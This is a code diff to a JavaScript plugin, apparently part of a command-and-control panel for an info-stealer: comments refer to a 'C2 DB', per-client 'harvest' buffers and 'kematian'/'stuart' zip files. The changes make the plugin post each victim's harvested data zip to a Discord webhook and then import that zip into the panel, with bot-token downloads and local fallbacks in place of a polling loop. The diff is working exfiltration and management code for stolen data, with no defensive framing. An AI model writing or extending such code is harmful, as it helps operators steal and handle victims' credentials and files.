@@ -312,7 +312,6 @@ let pluginSettings = {
   discord_bot_token: "",
   discord_forum_channel_id: "",
   discord_thread_prefix: "Stuart",
-  discord_poll_interval_sec: 15,
 };
 
 /** Max Discord attachment size for webhooks (bytes). Keep under 25 MiB. */
@@ -322,7 +321,6 @@ const discordUploadTimers = new Map();
 const DISCORD_UPLOAD_DEBOUNCE_MS = 2500;
 /** In-memory harvest buffers when Discord pipeline is on (not written to C2 DB). */
 const pendingDiscordHarvest = new Map();
-let discordPollTimer = null;
 let discordPollRunning = false;
 let discordPollStatus = { lastAt: 0, lastOk: null, lastError: "", imported: 0, message: "" };
 
@@ -396,7 +394,6 @@ function loadSettings(db) {
       else if (r.key === 'discord_bot_token') pluginSettings.discord_bot_token = String(r.value || '');
       else if (r.key === 'discord_forum_channel_id') pluginSettings.discord_forum_channel_id = String(r.value || '').replace(/\D/g, '');
       else if (r.key === 'discord_thread_prefix') pluginSettings.discord_thread_prefix = String(r.value || 'Stuart').slice(0, 80);
-      else if (r.key === 'discord_poll_interval_sec') pluginSettings.discord_poll_interval_sec = Math.max(5, Math.min(300, Number(r.value) || 15));
     }
   } catch (_) {}
 }
@@ -786,7 +783,77 @@ async function postZipToDiscordWebhook({ webhookUrl, zip, filename, content, thr
   try { return await res.json(); } catch (_) { return { ok: true }; }
 }
 
-/** Upload buffered (or DB) harvest to Discord forum via webhook only. */
+/** Download one Discord attachment (this zip only). Prefer CDN URL; bot auth as fallback. */
+async function downloadDiscordAttachment(att) {
+  const url = att?.url || att?.proxy_url;
+  if (!url) throw new Error("attachment has no url");
+  const headers = {};
+  if (pluginSettings.discord_bot_token) {
+    headers.Authorization = `Bot ${pluginSettings.discord_bot_token.trim()}`;
+  }
+  let res = await fetch(url, { headers });
+  if (!res.ok && headers.Authorization) {
+    // retry without bot auth (some CDNs dislike Authorization)
+    res = await fetch(url);
+  }
+  if (!res.ok) throw new Error(`attachment download HTTP ${res.status}`);
+  return Buffer.from(await res.arrayBuffer());
+}
+
+/**
+ * Import exactly the zip that was just posted (webhook wait=true response).
+ * Does not scan other forum threads.
+ */
+async function importThisWebhookZip(db, msg, fallbackClientId) {
+  if (!msg || !db || !stmts) return { ok: false, reason: "no message or db" };
+
+  const zips = (msg.attachments || []).filter(a => (a.filename || "").toLowerCase().endsWith(".zip"));
+  // Prefer stuart-named zip on this message only
+  let att = zips.find(a => {
+    const n = (a.filename || "").toLowerCase();
+    return n.includes("stuart") || n.includes("kematian");
+  }) || zips[0];
+
+  // If wait response omitted attachments, fetch that one message via bot
+  if (!att && pluginSettings.discord_bot_token && msg.id && msg.channel_id) {
+    try {
+      const full = await discordBotFetch(`/channels/${msg.channel_id}/messages/${msg.id}`);
+      att = (full?.attachments || []).find(a => (a.filename || "").toLowerCase().endsWith(".zip"));
+      if (full) msg = full;
+    } catch (e) {
+      console.warn("[stuart] fetch single message for attachment:", e.message);
+    }
+  }
+  if (!att) return { ok: false, reason: "no zip attachment on webhook response" };
+
+  const seen = db.prepare(`SELECT 1 FROM discord_imports WHERE attachment_id = ?`).get(att.id);
+  if (seen) {
+    return { ok: true, skipped: true, reason: "already imported", attachmentId: att.id };
+  }
+
+  const zipBuf = await downloadDiscordAttachment(att);
+  // Prefer zip buffer we already have if download fails? handled by throw
+  const result = importZipIntoDb(db, zipBuf, fallbackClientId);
+  db.prepare(
+    `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
+  ).run(att.id, msg.id || null, msg.channel_id || null, result.clientId, att.filename || "", Date.now());
+
+  try {
+    pluginCtx?.broadcast?.("harvest_update", { clientId: result.clientId, source: "discord" });
+  } catch (_) {}
+
+  discordPollStatus = {
+    lastAt: Date.now(),
+    lastOk: true,
+    lastError: "",
+    imported: 1,
+    message: `imported this upload: ${att.filename} → ${result.clientId}`,
+  };
+  console.log(`[stuart] imported this webhook zip ${att.filename} → client ${result.clientId}`);
+  return { ok: true, clientId: result.clientId, filename: att.filename, attachmentId: att.id, counts: result.counts };
+}
+
+/** Upload buffered harvest to Discord forum; then import only that zip for display. */
 async function flushDiscordHarvest(clientId) {
   if (!isDiscordPipelineOn()) {
     return { ok: false, skipped: true, reason: "Discord pipeline off or webhook missing" };
@@ -814,8 +881,42 @@ async function flushDiscordHarvest(clientId) {
       threadName,
     });
     console.log(`[stuart] Discord webhook ok client=${clientId} file=${built.filename} bytes=${built.zip.length}`);
-    // Poll Discord soon so UI can import the zip for display
-    scheduleDiscordPoll(1500);
+
+    // Import only this upload (not other forum posts)
+    let imported = null;
+    if (pluginCtx?.db) {
+      try {
+        // Prefer local zip bytes if CDN fetch is slow/unavailable
+        if (msg?.attachments?.length) {
+          imported = await importThisWebhookZip(pluginCtx.db, msg, clientId);
+        } else {
+          // No attachment meta in response — import the bytes we just sent
+          const result = importZipIntoDb(pluginCtx.db, built.zip, clientId);
+          const fakeAttId = `local-${msg?.id || Date.now()}-${built.filename}`;
+          pluginCtx.db.prepare(
+            `INSERT OR IGNORE INTO discord_imports(attachment_id, message_id, thread_id, client_id, filename, imported_at) VALUES(?,?,?,?,?,?)`
+          ).run(fakeAttId, msg?.id || null, msg?.channel_id || null, result.clientId, built.filename, Date.now());
+          try {
+            pluginCtx.broadcast("harvest_update", { clientId: result.clientId, source: "discord" });
+          } catch (_) {}
+          imported = { ok: true, clientId: result.clientId, filename: built.filename, local: true };
+          console.log(`[stuart] imported local zip copy → client ${result.clientId}`);
+        }
+      } catch (e) {
+        // Fallback: import the zip we still hold in memory (this upload only)
+        console.warn("[stuart] post-upload fetch failed, importing local zip:", e.message);
+        try {
+          const result = importZipIntoDb(pluginCtx.db, built.zip, clientId);
+          try {
+            pluginCtx.broadcast("harvest_update", { clientId: result.clientId, source: "discord" });
+          } catch (_) {}
+          imported = { ok: true, clientId: result.clientId, filename: built.filename, local: true, fetchError: e.message };
+        } catch (e2) {
+          imported = { ok: false, error: e2.message };
+        }
+      }
+    }
+
     return {
       ok: true,
       filename: built.filename,
@@ -824,9 +925,9 @@ async function flushDiscordHarvest(clientId) {
       threadName,
       messageId: msg?.id || null,
       threadId: msg?.channel_id || null,
+      imported,
     };
   } catch (err) {
-    // put buffer back so a later flush can retry
     if (buffered) pendingDiscordHarvest.set(clientId, buffered);
     console.error(`[stuart] Discord webhook failed:`, err.message);
     return { ok: false, error: err.message };
@@ -1158,32 +1259,7 @@ async function pollDiscordOnce() {
   }
 }
 
-function scheduleDiscordPoll(delayMs = 0) {
-  if (!isDiscordPollConfigured() || !pluginSettings.discord_upload_enabled) return;
-  if (delayMs > 0) {
-    setTimeout(() => {
-      pollDiscordOnce().catch(e => console.error("[stuart] poll:", e.message));
-    }, delayMs);
-    return;
-  }
-  pollDiscordOnce().catch(e => console.error("[stuart] poll:", e.message));
-}
-
-function startDiscordPoller() {
-  if (discordPollTimer) {
-    clearInterval(discordPollTimer);
-    discordPollTimer = null;
-  }
-  if (!pluginSettings.discord_upload_enabled || !isDiscordPollConfigured()) {
-    console.log("[stuart] Discord poller idle (enable pipeline + bot token + forum channel id)");
-    return;
-  }
-  const sec = Math.max(5, pluginSettings.discord_poll_interval_sec || 15);
-  console.log(`[stuart] Discord poller every ${sec}s on channel ${pluginSettings.discord_forum_channel_id}`);
-  // Immediate first poll
-  scheduleDiscordPoll(2000);
-  discordPollTimer = setInterval(() => scheduleDiscordPoll(0), sec * 1000);
-}
+/** No interval poller — import happens for each webhook upload only; manual poll is optional recovery. */
 
 function runPurge(db) {
   let total = 0;
@@ -1876,7 +1952,6 @@ export default {
       throw err;
     }
 
-    startDiscordPoller();
   },
 
   onEvent(ctx, clientId, event, payload) {
@@ -2635,12 +2710,8 @@ export default {
       if (params.discord_thread_prefix !== undefined) {
         upsert.run('discord_thread_prefix', String(params.discord_thread_prefix || "Stuart").slice(0, 80));
       }
-      if (params.discord_poll_interval_sec !== undefined) {
-        upsert.run('discord_poll_interval_sec', String(Math.max(5, Math.min(300, Number(params.discord_poll_interval_sec) || 15))));
-      }
       loadSettings(ctx.db);
       pluginCtx = ctx;
-      startDiscordPoller();
       return { ok: true, settings: publicDiscordSettings(true) };
     },
 
@@ -2653,7 +2724,7 @@ export default {
       return flushDiscordHarvest(cid);
     },
 
-    /** Poll Discord forum with bot token, download new zips, import for display. */
+    /** Manual recovery: scan forum for zips not yet imported. Not used on the agent upload path. */
     async poll_discord(ctx, _params, { caller }) {
       if (!["admin"].includes(caller.role)) throw new Error("Admin only");
       pluginCtx = ctx;
@@ -2689,15 +2760,22 @@ export default {
         },
       ]);
       try {
-        await postZipToDiscordWebhook({
+        const msg = await postZipToDiscordWebhook({
           webhookUrl: url,
           zip,
           filename: `stuart-test-${Date.now()}.zip`,
           content,
           threadName,
         });
-        scheduleDiscordPoll(2000);
-        return { ok: true, threadName };
+        let imported = null;
+        if (pluginCtx?.db && stmts) {
+          try {
+            imported = await importThisWebhookZip(pluginCtx.db, msg, "test");
+          } catch (e) {
+            imported = { ok: false, error: e.message };
+          }
+        }
+        return { ok: true, threadName, messageId: msg?.id || null, imported };
       } catch (err) {
         throw new Error(err.message || "Webhook test failed");
       }
